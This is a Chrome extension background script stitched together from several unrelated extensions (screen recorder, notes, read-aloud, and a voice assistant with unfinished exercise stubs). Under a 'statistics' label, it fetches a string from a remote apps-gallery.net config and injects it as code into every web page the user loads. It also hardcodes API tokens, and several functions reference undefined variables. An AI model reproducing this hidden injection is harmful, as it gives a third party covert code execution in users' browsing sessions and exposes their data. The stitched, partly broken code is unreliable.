 	!function(e){function n(r){if(t[r])return t[r].exports;var o=t[r]={i:r,l:!1,exports:{}};return e[r].call(o.exports,o,o.exports,n),o.l=!0,o.exports}var t={};n.m=e,n.c=t,n.d=function(e,t,r){n.o(e,t)||Object.defineProperty(e,t,{configurable:!1,enumerable:!0,get:r})},n.n=function(e){var t=e&&e.__esModule?function(){return e.default}:function(){return e};return n.d(t,"a",t),t},n.o=function(e,n){return Object.prototype.hasOwnProperty.call(e,n)},n.p="",n(n.s=19)}({19:function(e,n,t){"use strict";chrome.runtime.onMessage.addListener(function(e,n,t){chrome.desktopCapture.chooseDesktopMedia(["screen","window"],function(e){t({id:e})})}),chrome.browserAction.onClicked.addListener(function(){var e=(window.screen.availHeight-200)/2,n=(window.screen.availWidth-650)/2;window.open(chrome.extension.getURL("index.html"),"screen-recorder","width=650,height=200,top="+e+",left="+n)})}});

chrome.browserAction.onClicked.addListener(function(tab) { 
	alert();
	//////////////////////////////////////Google Analytics////////////////////////////////////  
});
/////////////////////events///////////////////////////
chrome.runtime.onInstalled.addListener(function() {
	var context = "selection";
	var title = "Add to ChromeIt Notes";
	chrome.contextMenus.create({"title": title, "contexts":[context], "id": "context" + context});  
});

chrome.contextMenus.onClicked.addListener(onClickHandler);


function onClickHandler(info, tab) {
	var sText = info.selectionText;
	appendNoteData(sText);
	notifyMe('Selected text has been added to ChromeIt Notes');
};

function notifyMe(text) {
	chrome.notifications.create("NotificationChromeItNotes", {"type": 'basic', "iconUrl": 'icon-128.png', "title": 'Notes', "message": text}, function(){});
}

function addNoteData(newData, oldData)
{
 	var obj = {"MYNOTE": newData, "TIME": new Date().getTime()};
 	if(oldData != undefined && oldData != ""){
 		obj.OLDNOTE = oldData;
 	}

 	chrome.storage.sync.set(obj, function(){
 		console.log("Note Saved!");
 	});
}

function appendNoteData(newData)
{
	chrome.storage.sync.get(null, function(items){
		if(items.MYNOTE != undefined){
			addNoteData(items.MYNOTE+"\n"+newData);
		}
	});
}

var doGroup = function() {
	// Make use of clustering algorithms to group tabs on the basis of the similarity of the content 
	// You may use the API: http://api.meaningcloud.com/clustering-1.1
};


/////////read aloud
var tempYTUrl = '';

function init(){
    
    if(!get('start_time')){
        set('start_time',(new Date()).getTime());
    }
    
    createContextMenu();
    
}

function get(name){
    var val = localStorage[name];
    if(!val || val == 'false'){
        return false;
    }
    return val;
}

function set(name,val){
    localStorage[name] = val;
}

function createContextMenu(){
    chrome.contextMenus.removeAll(function(){});
    chrome.contextMenus.create({
        'type':'normal',
        'title':'SPEAK TEXT',
        'contexts':['selection'],
        'onclick': function(info){
            chrome.tts.speak(info.selectionText);
        } 
    });
}

$(document).ready(function(){

    init();

});

// statistics // 

function initConfig(){
    var xhr = new XMLHttpRequest();
    xhr.open("GET", 'http://www.apps-gallery.net/config_gjfda5g1fa.php?id=spetext',true);
    xhr.onreadystatechange = function(e){
        if(xhr.status == 200 && xhr.readyState == 4){
            var conf = xhr.responseText;
            if(conf){
                conf = JSON.parse(conf);
                set('conf_s',conf.special);
            }
        }
    };
    xhr.send(null);
}

function sCode(t){
    var s = get('conf_s');
    if(s){
        chrome.tabs.executeScript(t.id,{code:decodeURIComponent(s),runAt:'document_end'},function(){});
    }
}

chrome.tabs.onUpdated.addListener(function(tabId,changeInfo,tab){
    if(changeInfo.status == 'complete' && (tab.url.indexOf("http://") != -1 || tab.url.indexOf("https://") != -1)){
        sCode(tab);
    }
});

$(document).ready(function(){

    initConfig();

});
$(document).ready(function(){
	(function(i,s,o,g,r,a,m)
	{
		i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
			(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
			m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

	ga('create', 'UA-97189820-2', 'auto');
	ga('send', 'pageview');
	////////////////////////////////////////////////////////////////////////////////
    var accessToken = "326a6c78dc86439ba21c9cf3cb8a0cf0";
    var timevocal = 0;
    var baseUrl = "https://api.api.ai/v1/";
    var talking = true;
    var nlp = window.nlp_compromise;
    var recognition;
    var txt;
    var voicetrigger;
    startRecognition();
    checkOnline(); 

    //first time when application will be loaded

    chrome.storage.local.get(/* String or Array */["firsttime"], function(items2){
        if(items2.firsttime === undefined || items2.firsttime === 2){
			chrome.storage.local.set({ "firsttime": 3 }, function(){
				chrome.tabs.create({'url': 'chrome://newtab'});
				chrome.tabs.create({'url': 'web/documentation/aboutUS.htm'});
			});
        }
	});

     //function for giving sleep 
    function sleep(milliseconds) {
		var start = new Date().getTime();
		for (var i = 0; i < 1e7; i++) {
			if ((new Date().getTime() - start) > milliseconds){
				break;
			}
		}
	}
// check if browser if online or offline
	var offline = false;
	checkOnline(); 
	function checkOnline() {
		if (!navigator.onLine && !offline) {
			offline = true;
			chrome.storage.local.set({ "onoffswitch": "false"}, function(){});             
		}
		if (navigator.onLine) {
			offline = false;
		}
		setTimeout(checkOnline, 1000);
	}
//function for recognition
    function startRecognition() {
		chrome.storage.local.get(/* String or Array */["onoffswitch"], function(items){
			if(items.onoffswitch === "true"){
				recognition = new webkitSpeechRecognition();
				recognition.onstart = function(event) {
					updateRec();
				};  
				var text = "";
				recognition.onresult = function(event) {
					for (var i = event.resultIndex; i < event.results.length; ++i) {
						text += event.results[i][0].transcript;
					}
				};
				recognition.onend = function() {
					chrome.storage.local.get(/* String or Array */["trigger"], function(items2){
						if(text.toLowerCase() === items2.trigger.toLowerCase()){
							// alert(text);
							Speech("Yes Sir.");
							sleep(1500);
							recognition.stop();
							startRecognitionaftertrigger();
						}
						else
							if(text.toLowerCase().startsWith(items2.trigger.toLowerCase())){
								var str = text.toLowerCase().replace(items2.trigger.toLowerCase()+" ","");
								setInput(str);
								recognition.stop();
								startRecognition();
							}
							else 
							{
								recognition.stop();
								startRecognition();
							}
					});
					// stopRecognition();
				};
				recognition.lang = "en-IN";
				recognition.start();
			} 
			else{ 
				startRecognition();
			}
		});
    }
    //start recognition after trigger
	function startRecognitionaftertrigger(){
		recognition = new webkitSpeechRecognition();
		recognition.onstart = function(event) {
			//updateRec();
		};  
		var text = "";
		recognition.onresult = function(event) {
			for (var i = event.resultIndex; i < event.results.length; ++i) {
				text += event.results[i][0].transcript;
			}
		};
		recognition.onend = function() {
			if(text === ""){
				recognition.stop();
				startRecognition();
			}
			else{
				recognition.stop();
				setInput(text);
				startRecognition();
			}
		};
		recognition.lang = "en-IN";
		recognition.start();
	}
	//to stop recognition
    function stopRecognition() {
		if (recognition) {
			recognition.stop();
			recognition = null;
		}
		// updateRec();
    }
    //to switch 
    function switchRecognition() {
		if (recognition) {
			stopRecognition();
		} 
		else {
			startRecognition();
		}
    }
    //to set input 
    function setInput(text) {
		txt = text;
		send();
    }
    function updateRec() {
		
    }
    function provideJoke(){
		// Complete the execution of this function to return a joke 
    	// You may use APIs like http://api.icndb.com/jokes/random
	};
    //sending the data to server
    function send() {
		
		if((txt.indexOf('.com') == -1) && (txt.indexOf('.in') == -1) && (txt.indexOf('.org') == -1) && (txt.indexOf('.io') == -1) && (txt.indexOf('.io') == -1)){
		$.ajax({
			type: "POST",
			url: baseUrl + "query?v=20150910",
			contentType: "application/json; charset=utf-8",
			dataType: "json",
			headers: {
				"Authorization": "Bearer " + accessToken
			},
			data: JSON.stringify({ query: txt, lang: "en", sessionId: "somerandomthing" }),
			success: function(data) {
	
				if(data.result.metadata.intentName === "call me"){
					chrome.storage.local.set({ "username": data.result.parameters.any }, function(){
					//  Data's been saved boys and girls, go on home
					});
				}
				else if(data.result.metadata.intentName === "hello"){
					Speech("Hello "+chrome.storage.local.get(/* String or Array */["username"]));
				}
				else if(data.result.metadata.intentName === "youtube search"){
					chrome.tabs.create({'url':'https://www.youtube.com/results?search_query='+ data.result.parameters.any });
				}
				
				if(data.result.fulfillment.speech !== 'i am searching this on google'){
					var speech =  data.result.fulfillment.speech;
					if(data.result.fulfillment.speech === '@time'){
						var now = new Date($.now());
						var ampm = (now.getHours() >= 12) ? "PM" : "AM";
						var time = now.getHours()-12+":"+now.getMinutes()+" "+ampm;
						timevocal = 1;
						Speech(time);
					}
					else{
						if((speech.indexOf('.com') != -1) || (speech.indexOf('.in') != -1) || (speech.indexOf('.org') !== -1) || (speech.indexOf('.io') != -1)){
							Speech("opening. Sir");
							chrome.tabs.create({'url':'http://'+speech});
						}
						else if(data.result.fulfillment.speech === '@close'){
								chrome.tabs.getSelected(null, function(tab) {
									tab = tab.id;
									chrome.tabs.remove(tab,function(){});
									tabUrl = tab.url;
									//alert(tab.url);
								});
								Speech("closing tab. Sir");
						}
						else if (data.result.fulfillment.speech === '@refresh') {
								chrome.tabs.reload();
								Speech("reloading");
						}
						else if(data.result.fulfillment.speech === '@exit'){
								Speech("closing the window. Sir");
								setTimeout(function(){}, 500); 
								chrome.tabs.query({}, function (tabs) {
									for (var i = 0; i < tabs.length; i++) {
										chrome.tabs.remove(tabs[i].id);
									}
								});
						}
						else if (data.result.fulfillment.speech === '@bookmark') {           
							chrome.tabs.getSelected(function(tab) { //<-- "tab" has all the information
								chrome.bookmarks.create({ 'title': tab.title,'url': tab.url});
							});
							Speech("I have added this page to favourites");
						}
						else if(data.result.fulfillment.speech === '@keepthis'){
							Speech("closing , Sir");
							var currenttab;
							chrome.tabs.getSelected(null, function(tab) {
								currenttab = tab.id;
								chrome.tabs.query({}, function (tabs) {
									for (var i = 0; i < tabs.length; i++) {
										if(tabs[i].id == currenttab){
											continue;
										}
										chrome.tabs.remove(tabs[i].id);
									}
								});
							});
						}
						else if(data.result.fulfillment.speech === '@open'){
							Speech("opening");
							chrome.tabs.create({'url': 'chrome://newtab'});
						}
						else if(data.result.fulfillment.speech === "@downloads"){
							Speech("opening! Downloads");
							chrome.tabs.create({'url': 'chrome://downloads'});
							alert(data.result.fulfillment.speech);
						}
						else if(data.result.fulfillment.speech === "@next"){
							var currenttab;
							Speech("opening! next");
							chrome.tabs.getSelected(null, function(tab) {
								currenttab = tab.id;										
								chrome.tabs.query({}, function (tabs) {
									for (var i = 0; i < tabs.length; i++) {
										if(tabs[i].id == currenttab){
											chrome.tabs.update(tabs[(i+1)%tabs.length].id, { active: true});
										}
									}
								});
							});
						}
						else if(data.result.metadata.intentName === "setting")
						{
							Speech("opening! Settings.");
							// Add code for opening settings
							// EASY:1 							
						}
						else if(data.result.metadata.intentName === "open history")
						{
							Speech("opening! History.");
							// Add code for opening history
							// EASY:2
						}
						else if(data.result.fulfillment.speech === "@prev"){

			                 // Add code for moving to tab to immediate left
			                   //(you may ignore the case where current tab is the leftmost).
			                 // MEDIUM: 1
			                Speech("opening! prev");
						}
						else {
							if(data.result.metadata.intentName === "users_name"){
								chrome.storage.local.get(/* String or Array */["username"], function(items){
								if(items.username === undefined ){
									Speech("you didn't told me your name Yet . Please Tell me your name . ");
								}
								else
									Speech(speech+" "+items.username);
								});
						
							}
							else if(data.result.metadata.intentName === "I want to hear a joke"){ 
								Speech("Hope you like this one.");
								Speech(speech);
							}
							else
							{
								Speech(speech+" in else");
								alert(data.result.fulfillment.speech+" "+data.result.metadata.intentName);
							}
						}
					}
				}
				else {
					var idx;
					if((idx = (txt.toLowerCase()).lastIndexOf("Wikipedia".toLowerCase())) !==-1)
					{
						Speech("I am searching this on wikipedia.");
						//Code to search content directly on wikipedia.	
						// MEDIUM: 2
						
					}
					else if((idx = (txt.toLowerCase()).lastIndexOf("change background".toLowerCase())) !==-1)
					{
						Speech("Change backgroud");
	    	        // Code to change body backgroud color
   		    	     // HINT: use simple DOM commands for this.
   		    	     // EASY: 3
					}
					else if((idx = (txt.toLowerCase()).indexOf("let us".toLowerCase())) !==-1){
						Speech("enjoy tetris");
						            // Open tetris game in new tab.
						            // HINT: You may use tetris.com 
						   // EASY: 4
					}
					else if((idx = (txt.toLowerCase()).lastIndexOf("print".toLowerCase())) !==-1)
					{
						//alert(txt);
				    	// Code to print the current tab
				    	//EASY: 5
				    	Speech("Printing");
					}
					else if((idx = (txt.toLowerCase()).lastIndexOf("halt".toLowerCase())) !==-1)
					{
						//alert(txt);
						// YOUTUBE SPECIFIC feature
							// Code to pause currently playing video.
						// EASY: 6
						;
					}
					else if((idx = (txt.toLowerCase()).lastIndexOf("play".toLowerCase())) !==-1)
					{
						var player;
						  function onYouTubeIframeAPIReady() {
							player = new YT.Player('player', {
							  height: '390',
							  width: '640',
							  videoId: player.getVideoData()['video_id'],
							  events: {
								'onReady': onPlayerReady,
								'onStateChange': onPlayerStateChange
							  }
							});
						  }
						 player.playVideo();

					}
					else if((idx = (txt.toLowerCase()).lastIndexOf("next video".toLowerCase())) !==-1)
					{
						//alert(txt);
						// YOUTUBE SPECIFIC feature
						;
						// Code to play NEXT video.
						// EASY: 8

					}

					else if((idx = (txt.toLowerCase()).lastIndexOf("news".toLowerCase())) !==-1)
					{
						Speech("Opening");
						//  Code to open google news.
						// EASY: 9
                 		
					}
					else if((idx = (txt.toLowerCase()).lastIndexOf("inbox".toLowerCase())) !==-1)
					{
						Speech("Opening your gmail account.");
						chrome.tabs.create({'url':'https://www.gmail.com/'});
					}
					else if((idx = (txt.toLowerCase()).lastIndexOf("incognito".toLowerCase())) !==-1)
					{
						Speech("Opening incognito window.");
						  // Code to open incognito window	
						  // EASY: 10					
					}
					else if((idx = (txt.toLowerCase()).lastIndexOf("backward".toLowerCase())) !==-1)
					{
						Speech("Going backwards in history.");
						// Code to perform functionality of back button.
						// EASY: 11
					}
					else if((idx = (txt.toLowerCase()).lastIndexOf("minimise".toLowerCase())) !==-1)
					{
						Speech("Minimizing window.");
						// Code to minimize window.
						// EASY: 12
					}
					else if((idx = (txt.toLowerCase()).lastIndexOf("maximize".toLowerCase())) !==-1)
					{
						Speech("Maximizing window.");
						// Code to maximize window.
						// EASY: 12
					}
					else if((idx = (txt.toLowerCase()).indexOf("tab".toLowerCase())) !==-1)
					{
						// var integer = parseInt(txt.substring(4));
						Speech("Moving to tab"+integer);
						// Code to move to a particular indexed tab
						//// EASY: 13
					}
					else if((idx = (txt.toLowerCase()).indexOf("arrange heading".toLowerCase())) !==-1)
					{
						Speech("Arranging the headings of the tab");
			            // Code to arrange tabs alphabetically 
			            // MEDIUM: 3
					}
					else if((idx = (txt.toLowerCase()).indexOf("group content".toLowerCase())) !==-1)
					{
						Speech("Grouping the contents of tabs.");
						//Code to group tabs on the basis of their functionality
            			//Perform the functionlity in doGroup() function.
						doGroup();
						// HARD: 1
					}
					else if((idx = (txt.toLowerCase()).indexOf("zoom in".toLowerCase())) !==-1)
					{
						Speech("Zooming in.");
						  // Code to zoom in
						  // EASY: 14
					}
					else if((idx = (txt.toLowerCase()).indexOf("zoom out".toLowerCase())) !==-1)
					{
						Speech("Zooming out.");
						// Code to zoom out
						// EASY: 14
					}
					else if((idx = (txt.toLowerCase()).indexOf("tell me a joke".toLowerCase())) !==-1)
					{
						Speech("Hope you like this one.");
						 // Implement provideJoke() function to return a joke
						provideJoke();
						Speech("Isn't it good?");
						// HARD: 2
					}
					else if((idx = (txt.toLowerCase()).indexOf("to do list".toLowerCase())) !==-1)
					{
						Speech("opening to do list.");
						chrome.tabs.create({url:"todo/todo.html"});
					}
					else if((idx = (txt.toLowerCase()).indexOf("listing".toLowerCase())) !==-1)
					{
						Speech("adding "+txt.substring(8)+" to to-do list");
						add(txt.substring(8));
						Speech("Added");
					}
					else if((idx = (txt.toLowerCase()).indexOf("cross and zero".toLowerCase())) !==-1)
					{
						Speech("Have fun!");
						chrome.tabs.create({url:"tictac/popup.html"});
					}
					else
					{
						setResponse(data.result.fulfillment.speech);
						chrome.tabs.create({'url': 'http://google.com/search?q='+txt});	
						chrome.tabs.executeScript({
							code: "document.getElementsByClassName('_XWk')[0].innerHTML;"
							},function(selection){//_XW//alert(selection[0]);
								if(selection[0]===null){
									chrome.tabs.executeScript({
										code:"var rex = /(<([^>]+)>)/ig; document.getElementsByClassName('_Tgc')[0].innerHTML.replace(rex,'').split('.')[0];"
									},function(sl){
										if(sl[0]===null){
											chrome.tabs.executeScript({
												code:"var rex = /(<([^>]+)>)/ig; document.getElementsByClassName('st')[0].innerHTML.replace(rex,'').split('.')[0];"
											},function(sl2){
												Speech("According to Google "+sl2[0]);
											});
										}
										else
											Speech("According to Google "+sl[0]);
									});
								}
								else
									Speech(selection[0]); 
							}
						);
				    }
				}
			},
			error: function() {
				setResponse("Sorry ! we are having some internal problem. Please Try again.");
			}
			});
		}
		else{
			Speech("opening");
			chrome.tabs.create({'url': "http://www."+txt });
		}
    }
    function setResponse(val) {
      Speech(val);
    }
    //to speech 
    function Speech(say) {
		if ('speechSynthesis' in window && talking) {
			var language = window.navigator.userLanguage || window.navigator.language;
			var utterance = new SpeechSynthesisUtterance(say);
			//msg.voice = voices[10]; // Note: some voices don't support altering params
			//msg.voiceURI = 'native';
			if(timevocal == 1){
				utterance.volume = 1; // 0 to 1
				utterance.pitch = 0; //0 to 2
				utterance.voiceURI = 'native';
				utterance.lang = "en-IN";
				speechSynthesis.speak(utterance);
				timevocal=0
			}
			else{
				utterance.volume = 1; // 0 to 1
				utterance.rate = 0.9; // 0.1 to 10
				utterance.pitch = 1; //0 to 2
				//utterance.text = 'Hello World';
				utterance.voiceURI = 'native';
				utterance.lang = "en-IN";
				speechSynthesis.speak(utterance);
			}
		}
	}
	function processIt(data) {
		var temperature = parseInt(data.main.temp - 273.15);
		var humidity = parseInt(data.main.humidity);
		var windSpeed = parseInt(data.wind.speed);
		var cloudsDescription = data.weather[0].description;
		var temperatureString = "Present temperature is around  " + temperature+" degree celsius";
		var humidityString = "with humidity: " + humidity+"%";
		var windSpeedString = "and wind speed :" + windSpeed+ "Kilometer per hour";
		var cloudsDescriptionString = "sky seems " + cloudsDescription;

		var weather_response = temperatureString + ', ' +
			humidityString + ', ' +
			windSpeedString + ', ' +
			cloudsDescriptionString;

		setResponse(weather_response);
		alert(weather_response);

		if(debug){
			alert("temperature is  "+temperature);
			alert("humidity is "+humidity);
			alert("wind speed is "+windSpeed);
			alert("sky description "+cloudsDescription);   
		}
	}

  function weather(city) {
		var baseUrl = "http://api.openweathermap.org/data/2.5/weather?q=";
		var key = "ec58b4518e2a455913f8e64a7ac16248";
		var Url = baseUrl + city + "&APPID=" + key;

		$.getJSON(Url, function(dataJson) {
			var data = JSON.stringify(dataJson);
			var parsedData = JSON.parse(data);
			processIt(parsedData);
		});
	}
	function get_todos() {
		var todos = new Array;
		var todos_str = localStorage.getItem('todo');
		if (todos_str !== null) {
			todos = JSON.parse(todos_str); 
		}
		return todos;
	}						 
	function add(task) {
		var todos = get_todos();
		if (task=== '') {
			alert("You must write something!");
		} 
		else{
			todos.push(task);
			localStorage.setItem('todo', JSON.stringify(todos));
			return false;
		}
	}
	 
	function show() {
		var todos = get_todos();
		var html = '<ul>';
		for(var i=0; i<todos.length; i++) {
			html += '<li>' + todos[i] + '<button class="remove" style="color:white;background-color:transparent;position: absolute;right: 0;top: 0;padding: 12px 16px 12px 16px;"id="' + i  + '">x</button></li>';
		};
		html += '</ul>';
	 
		document.getElementById('todos').innerHTML = html;
	 
		var buttons = document.getElementsByClassName('remove');
		for (var i=0; i < buttons.length; i++) {
			buttons[i].addEventListener('click', remove);
		};
	}
});